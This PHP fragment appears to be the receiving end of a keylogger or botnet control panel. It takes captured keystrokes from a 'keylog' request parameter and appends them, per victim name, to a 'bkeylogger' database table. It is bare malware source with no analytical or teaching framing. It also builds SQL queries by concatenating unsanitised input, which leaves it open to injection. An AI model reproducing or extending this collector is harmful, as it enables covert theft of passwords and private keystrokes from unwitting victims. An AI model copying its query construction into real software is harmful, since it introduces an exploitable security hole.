
<?php
	if($name!=NULL)
	{
		$keyloggercon=mysql_connect($host,$user,$pass);
		mysql_select_db($db,$keyloggercon);
		$selkeylogger=mysql_query("select * from bkeylogger where sname='".$name."'");
		$rowkeylogger=mysql_fetch_array($selkeylogger);
		
		if($rowkeylogger['sname']!=NULL)
		{
			$sqlkeylogger="update bkeylogger set stext='".$rowkeylogger['stext'].fud_head($_GET['keylog'])."' where sname='".$name."'";
		}
		else
		{
			$sqlkeylogger="INSERT INTO bkeylogger (sid, sname, stext) VALUES (NULL, '".$name."', '".fud_head($_GET['keylog'])."');";
		}
		$keyloggercon=mysqli_connect($host,$user,$pass,$db);		
			mysqli_query($keyloggercon,$sqlkeylogger);
		mysqli_close($keyloggercon);
	}
?>

